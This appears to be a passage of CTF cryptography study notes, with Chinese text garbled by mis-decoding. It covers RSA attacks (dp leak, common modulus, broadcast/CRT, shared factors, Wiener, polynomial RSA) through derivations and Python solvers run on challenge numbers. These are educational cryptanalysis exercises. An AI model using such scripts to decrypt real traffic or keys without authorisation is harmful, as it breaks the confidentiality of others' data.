<h3 id="å·²çŸ¥necdpdp-d-modp-1">å·²çŸ¥n,e,c,dp(dp â‰¡ d mod(p-1))</h3>
<blockquote>
<p>e = 65537 n = 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847 c = 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869 dp = 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</p>
</blockquote>
<p>æ•°å­¦æ¨å¯¼ <span class="math display">\[ å·²çŸ¥dp â‰¡ d mod (p-1), e*d â‰¡ 1 mod(p-1)(q-1).\\å¯å¾—edp â‰¡ ed mod(p-1).\\å±•å¼€å¯å¾—ed = edp +k_1(p-1) = 1 + k_2(p-1)(q-1).\\dp &lt; p-1, e&gt; k_2*(q-1)-k_1.\\ \]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (e * dp - <span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> n % ((e * dp - <span class="number">1</span>) // i + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        q = n // ((e * dp - <span class="number">1</span>) // i + <span class="number">1</span>)</span><br><span class="line">        phi = (q - <span class="number">1</span>) * ((e * dp - <span class="number">1</span>) // i)</span><br><span class="line">        d = gmpy2.invert(e, phi)</span><br><span class="line">        m = gmpy2.powmod(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="æå–å…¬é’¥flagä¿¡æ¯">æå–å…¬é’¥/flagä¿¡æ¯</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">path = <span class="string">r&#x27;C:\public.key&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.import_key(f.read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e = %d&#x27;</span> % key.e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % key.n)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">tmp = <span class="built_in">int</span>.from_bytes(f, byteorder=<span class="string">&#x27;big&#x27;</span>)  <span class="comment"># é«˜ä½å­˜å‚¨</span></span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>
<p>åœ¨çº¿å·¥å…·ï¼š<a href="https://security.feishu.cn/link/safety?target=http://www.hiencode.com/pub_asys.html&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">http://www.hiencode.com/pub_asys.html</a> è§£æå…¬é’¥</p>
<h3 id="å…±æ¨¡æ”»å‡»">å…±æ¨¡æ”»å‡»</h3>
<blockquote>
<p>n = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</p>
</blockquote>
<blockquote>
<p>c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361 e1 = 11187289 c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397 e2 = 9647291</p>
</blockquote>
<h4 id="æ•°å­¦åŸºç¡€æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•">æ•°å­¦åŸºç¡€ï¼šæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</h4>
<p>$$ æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¯ä»¥åœ¨æ±‚å‡ºa,bçš„æœ€å¤§å…¬çº¦æ•°çš„åŒæ—¶ï¼Œæ±‚å‡ºæ»¡è¶³ax+by = gcd(a, b)çš„x,yã€‚<br>
</p>
<p>æ±‚æœ€å¤§å…¬çº¦æ•°ï¼šæ¬§å‡ é‡Œå¾—ç®—æ³•(è¾—è½¬ç›¸é™¤)<br>
</p>
<p>åœ¨åˆ°è¾¾è¾—è½¬ç›¸é™¤çš„é€’å½’è¾¹ç•Œæ—¶ï¼Œb==0ï¼Œa=gcd(a,b)ã€‚è¿™æ—¶ï¼Œa+b*0=gcd(a,b)ï¼Œx=1,y=0<br>
</p>
<p>ä»é€’å½’çš„ä¸‹ä¸€å±‚å¾€ä¸Šä¸€å±‚æ¨å¯¼ï¼Œå‡è®¾æˆ‘ä»¬å·²çŸ¥x_1,y_1ä½¿b<em>x_1+(a mod b)</em>y_1=gcd(b, (a mod b))=gcd(a,b)<br>
</p>
<p>é¦–å…ˆå·²çŸ¥a mod b = a - a // b * b<br>
</p>
<p>å¸¦å›ä¸Šä¸€ä¸ªå¼å­ï¼šÂ b<em>x_1 + (a-(a//b)b)y_1= bx_1 + ay_1 â€“ (a//b)by_1= a*y_1 + b</em>(x_1 â€“ (a//b)*y_1) = gcd(a,b)<br>
</p>
<p>x = y_1, y = x_1 - (a//b)*y_1 $$</p>
<h4 id="è§£é¢˜æ¨å¯¼">è§£é¢˜æ¨å¯¼</h4>
<p><span class="math display">\[ é¦–å…ˆå¯çŸ¥gcd(e_1, e_2) = 1ï¼Œä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—å¯ä»¥æ±‚å‡ºæ»¡è¶³e_1*s_1+e_2*s_2 = 1çš„s_1å’Œs_2ã€‚\ åˆå·²çŸ¥c_1 â‰¡ m^{e_1} mod n, c_2 â‰¡ m^{e_2} mod n,å¯å¾—c_1^{s_1}*c_2^{s_2} mod n â‰¡ m^{(e_1*s_1+e_2*s_2)} â‰¡ mã€‚ \]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> y, x - (a // b) * y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gongmo</span>(<span class="params">n, c1, c2, e1, e2</span>):</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># æ±‚æ¨¡åå…ƒç´ </span></span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line">result = gongmo(n, c1, c2, e1, e2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(result))</span><br></pre></td></tr></table></figure>
<h3 id="å¹¿æ’­æ”»å‡»">å¹¿æ’­æ”»å‡»</h3>
<p>ç‰¹ç‚¹ï¼šç»™å‡ºå¤šç»„n,cï¼Œä½¿ç”¨åŒä¸€ä¸ªeåŠ å¯†ã€‚</p>
<h4 id="è§£é¢˜æ€è·¯1éå†æ¯å¯¹nå¯»æ‰¾æ˜¯å¦æœ‰å…¬çº¦æ•°">è§£é¢˜æ€è·¯1ï¼šéå†æ¯å¯¹n,å¯»æ‰¾æ˜¯å¦æœ‰å…¬çº¦æ•°</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]</span><br><span class="line">c = [c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(n[i], n[j]) != <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(i, j)  <span class="comment"># è¾“å‡ºå¯¹åº”çš„nçš„åºå·</span></span><br><span class="line">                p = gmpy2.gcd(n[i], n[j])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>, p)</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>, q)</span><br><span class="line">                d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;d = &quot;</span>, d)</span><br><span class="line">                m = <span class="built_in">pow</span>(c[i], d, n[i])</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;m = &quot;</span>, m)</span><br></pre></td></tr></table></figure>
<h4 id="è§£é¢˜æ€è·¯2ä¸­å›½å‰©ä½™å®šç†">è§£é¢˜æ€è·¯2ï¼šä¸­å›½å‰©ä½™å®šç†</h4>
<h5 id="æ•°å­¦åŸºç¡€-1">æ•°å­¦åŸºç¡€</h5>
<p><span class="math display">\[ å‡è®¾æ•´æ•°m_1,m_2,...m_nä¸¤ä¸¤äº’ç´ ï¼Œåˆ™å¯¹äºä»»æ„çš„æ•´æ•°a_1,a_2,...a_nï¼Œæ–¹ç¨‹ç»„\ \begin{equation} \begin{cases} x â‰¡ a_1 mod m_1 \ x â‰¡ a_2 mod m_2 \ ... \ x â‰¡ a_n mod m_n \end{cases} \end{equation} \]</span></p>
<p><span class="math display">\[ éƒ½å­˜åœ¨æ•´æ•°è§£ï¼Œè‹¥X ,Yéƒ½æ»¡è¶³è¯¥æ–¹ç¨‹ç»„ï¼ŒX â‰¡ Y modNï¼Œå…¶ä¸­N=m_1*m_2*...*m_nã€‚å…·ä½“è€Œè¨€ï¼Œ\ x â‰¡ \sum_{i=1}^na_i\*\frac{N}{m_i}*[(\frac{N}{m_i})^{-1}]_{m_i}modN \]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line">N1 = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span></span><br><span class="line">c1 = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line"></span><br><span class="line">N2 = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span></span><br><span class="line">c2 = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line"></span><br><span class="line">N3 = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span></span><br><span class="line">c3 = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br><span class="line"></span><br><span class="line">N = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="comment"># å°†é¢˜ç›®ç»™çš„æ‰€æœ‰å€¼è½¬æˆåè¿›åˆ¶å¹¶æ”¾è¿›åˆ—è¡¨ä¸­</span></span><br><span class="line">    N.append(<span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="string">&#x27;N&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))), <span class="number">5</span>))</span><br><span class="line">    c.append(<span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="string">&#x27;c&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>))), <span class="number">5</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;N&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>), <span class="string">&#x27;=&#x27;</span>, N[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c&#x27;</span> + <span class="built_in">str</span>(i + <span class="number">1</span>), <span class="string">&#x27;=&#x27;</span>, c[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder</span>(<span class="params">modulus, remainders</span>):</span><br><span class="line">    Sum = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, modulus)</span><br><span class="line">    <span class="keyword">for</span> m_i, r_i <span class="keyword">in</span> <span class="built_in">zip</span>(modulus, remainders):</span><br><span class="line">        p = prod // m_i</span><br><span class="line">        Sum += r_i * (inverse(p, m_i) * p)</span><br><span class="line">    <span class="keyword">return</span> Sum % prod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># print(chinese_remainder(N,c))</span></span><br><span class="line">pow_m_e = chinese_remainder(N, c)</span><br><span class="line"><span class="comment"># pow_m_e = 17446992834638639179129969961058029457462398677361658450137832328330435503838651797276948890990069700515669656391607670623897280684064423087023742140145529356863469816868212911716782075239982647322703714504545802436551322108638975695013439206776300941300053940942685511792851350404139366581130688518772175108412341696958930756520037</span></span><br><span class="line">m = iroot(pow_m_e, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="ç»´çº³æ”»å‡»ä½è§£å¯†æŒ‡æ•°">ç»´çº³æ”»å‡»(ä½è§£å¯†æŒ‡æ•°)</h3>
<h4 id="æ•°å­¦åŸºç¡€è¿åˆ†æ•°å±•å¼€">æ•°å­¦åŸºç¡€ï¼šè¿åˆ†æ•°å±•å¼€</h4>
<p><span class="math display">\[ a = a_0+\frac{1}{a_1+\frac{1}{a2+\frac{1}{...}}} \]</span></p>
<p>ç®€åŒ–ä¸ºa=[a0;a1,a2,...an]è®°ä½œå¯¹açš„è¿åˆ†æ•°å±•å¼€ã€‚</p>
<p>è¿åˆ†æ•°å®šç†ï¼š <span class="math display">\[ å½“\mid x-\frac{a}{b} \mid&lt;\frac{1}{2b^2}æ—¶ï¼Œ\frac{a}{b}æ˜¯xçš„ä¸€ä¸ªè¿åˆ†æ•°è¿‘ä¼¼ã€‚ \]</span></p>
<h3 id="æ¨å¯¼">æ¨å¯¼</h3>
<p><span class="math display">\[ å½“æ»¡è¶³d&lt;\frac{1}{3}N^{\frac{1}{4}}æ—¶ï¼Œä¸€å®šèƒ½åˆ†è§£Nã€‚\ ä»¤Î»(N)=lcm(pâˆ’1,qâˆ’1)=\frac{Ï†(N)}{g}ï¼Œs = 1-p-q,\ å·²çŸ¥e*d = 1 + k*Î»(N),åˆ™edg-kN=g+ks.\ ä¸¤è¾¹åŒé™¤dgNå¾—\frac{e}{N}-\frac{k}{dg}=(\frac{k}{dg})(\frac{s}{N})+\frac{1}{dN},\ æ‰€ä»¥å½“d&lt;\frac{\sqrt{2}}{2g}N^{\frac{1}{4}}æ—¶ï¼Œ\frac{k}{dg}æ˜¯\frac{e}{N}çš„è¿åˆ†æ•°è¿‘ä¼¼ã€‚ \]</span></p>
<p>è„šæœ¬ï¼š<a href="https://security.feishu.cn/link/safety?target=https://github.com/pablocelayes/rsa-wiener-attack&amp;scene=ccm&amp;logParams=%7B%22location%22:%22ccm_drive%22%7D&amp;lang=zh-CN">GitHub - pablocelayes/rsa-wiener-attack: A Python implementation of the Wiener attack on RSA public-key encryption scheme.</a></p>
<h3 id="å¤šé¡¹å¼rsa">å¤šé¡¹å¼RSA</h3>
<blockquote>
<p>Prime: 43753 Modulus: 34036<em>y^177 + 23068</em>y^176 + 13147<em>y^175 + 36344</em>y^174 + 10045<em>y^173 + 41049</em>y^172 + 17786<em>y^171 + 16601</em>y^170 + 7929<em>y^169 + 37570</em>y^168 + 990<em>y^167 + 9622</em>y^166 + 39273<em>y^165 + 35284</em>y^164 + 15632<em>y^163 + 18850</em>y^162 + 8800<em>y^161 + 33148</em>y^160 + 12147<em>y^159 + 40487</em>y^158 + 6407<em>y^157 + 34111</em>y^156 + 8446<em>y^155 + 21908</em>y^154 + 16812<em>y^153 + 40624</em>y^152 + 43506<em>y^151 + 39116</em>y^150 + 33011<em>y^149 + 23914</em>y^148 + 2210<em>y^147 + 23196</em>y^146 + 43359<em>y^145 + 34455</em>y^144 + 17684<em>y^143 + 25262</em>y^142 + 982<em>y^141 + 24015</em>y^140 + 27968<em>y^139 + 37463</em>y^138 + 10667<em>y^137 + 39519</em>y^136 + 31176<em>y^135 + 27520</em>y^134 + 32118<em>y^133 + 8333</em>y^132 + 38945<em>y^131 + 34713</em>y^130 + 1107<em>y^129 + 43604</em>y^128 + 4433<em>y^127 + 18110</em>y^126 + 17658<em>y^125 + 32354</em>y^124 + 3219<em>y^123 + 40238</em>y^122 + 10439<em>y^121 + 3669</em>y^120 + 8713<em>y^119 + 21027</em>y^118 + 29480<em>y^117 + 5477</em>y^116 + 24332<em>y^115 + 43480</em>y^114 + 33406<em>y^113 + 43121</em>y^112 + 1114<em>y^111 + 17198</em>y^110 + 22829<em>y^109 + 24424</em>y^108 + 16523<em>y^107 + 20424</em>y^106 + 36206<em>y^105 + 41849</em>y^104 + 3584<em>y^103 + 26500</em>y^102 + 31897<em>y^101 + 34640</em>y^100 + 27449<em>y^99 + 30962</em>y^98 + 41434<em>y^97 + 22125</em>y^96 + 24314<em>y^95 + 3944</em>y^94 + 18400<em>y^93 + 38476</em>y^92 + 28904<em>y^91 + 27936</em>y^90 + 41867<em>y^89 + 25573</em>y^88 + 25659<em>y^87 + 33443</em>y^86 + 18435<em>y^85 + 5934</em>y^84 + 38030<em>y^83 + 17563</em>y^82 + 24086<em>y^81 + 36782</em>y^80 + 20922<em>y^79 + 38933</em>y^78 + 23448<em>y^77 + 10599</em>y^76 + 7156<em>y^75 + 29044</em>y^74 + 23605<em>y^73 + 7657</em>y^72 + 28200<em>y^71 + 2431</em>y^70 + 3860<em>y^69 + 23259</em>y^68 + 14590<em>y^67 + 33631</em>y^66 + 15673<em>y^65 + 36049</em>y^64 + 29728<em>y^63 + 22413</em>y^62 + 18602<em>y^61 + 18557</em>y^60 + 23505<em>y^59 + 17642</em>y^58 + 12595<em>y^57 + 17255</em>y^56 + 15316<em>y^55 + 8948</em>y^54 + 38<em>y^53 + 40329</em>y^52 + 9823<em>y^51 + 5798</em>y^50 + 6379<em>y^49 + 8662</em>y^48 + 34640<em>y^47 + 38321</em>y^46 + 18760<em>y^45 + 13135</em>y^44 + 15926<em>y^43 + 34952</em>y^42 + 28940<em>y^41 + 13558</em>y^40 + 42579<em>y^39 + 38015</em>y^38 + 33788<em>y^37 + 12381</em>y^36 + 195<em>y^35 + 13709</em>y^34 + 31500<em>y^33 + 32994</em>y^32 + 30486<em>y^31 + 40414</em>y^30 + 2578<em>y^29 + 30525</em>y^28 + 43067<em>y^27 + 6195</em>y^26 + 36288<em>y^25 + 23236</em>y^24 + 21493<em>y^23 + 15808</em>y^22 + 34500<em>y^21 + 6390</em>y^20 + 42994<em>y^19 + 42151</em>y^18 + 19248<em>y^17 + 19291</em>y^16 + 8124<em>y^15 + 40161</em>y^14 + 24726<em>y^13 + 31874</em>y^12 + 30272<em>y^11 + 30761</em>y^10 + 2296<em>y^9 + 11017</em>y^8 + 16559<em>y^7 + 28949</em>y^6 + 40499<em>y^5 + 22377</em>y^4 + 33628<em>y^3 + 30598</em>y^2 + 4386<em>y + 23814 Ciphertext: 5209</em>x^176 + 10881<em>x^175 + 31096</em>x^174 + 23354<em>x^173 + 28337</em>x^172 + 15982<em>x^171 + 13515</em>x^170 + 21641<em>x^169 + 10254</em>x^168 + 34588<em>x^167 + 27434</em>x^166 + 29552<em>x^165 + 7105</em>x^164 + 22604<em>x^163 + 41253</em>x^162 + 42675<em>x^161 + 21153</em>x^160 + 32838<em>x^159 + 34391</em>x^158 + 832<em>x^157 + 720</em>x^156 + 22883<em>x^155 + 19236</em>x^154 + 33772<em>x^153 + 5020</em>x^152 + 17943<em>x^151 + 26967</em>x^150 + 30847<em>x^149 + 10306</em>x^148 + 33966<em>x^147 + 43255</em>x^146 + 20342<em>x^145 + 4474</em>x^144 + 3490<em>x^143 + 38033</em>x^142 + 11224<em>x^141 + 30565</em>x^140 + 31967<em>x^139 + 32382</em>x^138 + 9759<em>x^137 + 1030</em>x^136 + 32122<em>x^135 + 42614</em>x^134 + 14280<em>x^133 + 16533</em>x^132 + 32676<em>x^131 + 43070</em>x^130 + 36009<em>x^129 + 28497</em>x^128 + 2940<em>x^127 + 9747</em>x^126 + 22758<em>x^125 + 16615</em>x^124 + 14086<em>x^123 + 13038</em>x^122 + 39603<em>x^121 + 36260</em>x^120 + 32502<em>x^119 + 17619</em>x^118 + 17700<em>x^117 + 15083</em>x^116 + 11311<em>x^115 + 36496</em>x^114 + 1300<em>x^113 + 13601</em>x^112 + 43425<em>x^111 + 10376</em>x^110 + 11551<em>x^109 + 13684</em>x^108 + 14955<em>x^107 + 6661</em>x^106 + 12674<em>x^105 + 21534</em>x^104 + 32132<em>x^103 + 34135</em>x^102 + 43684<em>x^101 + 837</em>x^100 + 29311<em>x^99 + 4849</em>x^98 + 26632<em>x^97 + 26662</em>x^96 + 10159<em>x^95 + 32657</em>x^94 + 12149<em>x^93 + 17858</em>x^92 + 35805<em>x^91 + 19391</em>x^90 + 30884<em>x^89 + 42039</em>x^88 + 17292<em>x^87 + 4694</em>x^86 + 1497<em>x^85 + 1744</em>x^84 + 31071<em>x^83 + 26246</em>x^82 + 24402<em>x^81 + 22068</em>x^80 + 39263<em>x^79 + 23703</em>x^78 + 21484<em>x^77 + 12241</em>x^76 + 28821<em>x^75 + 32886</em>x^74 + 43075<em>x^73 + 35741</em>x^72 + 19936<em>x^71 + 37219</em>x^70 + 33411<em>x^69 + 8301</em>x^68 + 12949<em>x^67 + 28611</em>x^66 + 42654<em>x^65 + 6910</em>x^64 + 18523<em>x^63 + 31144</em>x^62 + 21398<em>x^61 + 36298</em>x^60 + 27158<em>x^59 + 918</em>x^58 + 38601<em>x^57 + 4269</em>x^56 + 5699<em>x^55 + 36444</em>x^54 + 34791<em>x^53 + 37978</em>x^52 + 32481<em>x^51 + 8039</em>x^50 + 11012<em>x^49 + 11454</em>x^48 + 30450<em>x^47 + 1381</em>x^46 + 32403<em>x^45 + 8202</em>x^44 + 8404<em>x^43 + 37648</em>x^42 + 43696<em>x^41 + 34237</em>x^40 + 36490<em>x^39 + 41423</em>x^38 + 35792<em>x^37 + 36950</em>x^36 + 31086<em>x^35 + 38970</em>x^34 + 12439<em>x^33 + 7963</em>x^32 + 16150<em>x^31 + 11382</em>x^30 + 3038<em>x^29 + 20157</em>x^28 + 23531<em>x^27 + 32866</em>x^26 + 5428<em>x^25 + 21132</em>x^24 + 13443<em>x^23 + 28909</em>x^22 + 42716<em>x^21 + 6567</em>x^20 + 24744<em>x^19 + 8727</em>x^18 + 14895<em>x^17 + 28172</em>x^16 + 30903<em>x^15 + 26608</em>x^14 + 27314<em>x^13 + 42224</em>x^12 + 42551<em>x^11 + 37726</em>x^10 + 11203<em>x^9 + 36816</em>x^8 + 5537<em>x^7 + 20301</em>x^6 + 17591<em>x^5 + 41279</em>x^4 + 7999<em>x^3 + 33753</em>x^2 + 34551*x + 9659</p>
</blockquote>
<p>åˆ†è§£Nä¸ºpå’Œqåï¼Œp,qçš„æ¬§æ‹‰å‡½æ•°ä¸ºprimeçš„på’Œqæœ€é«˜æ¬¡æ–¹-1ã€‚</p>
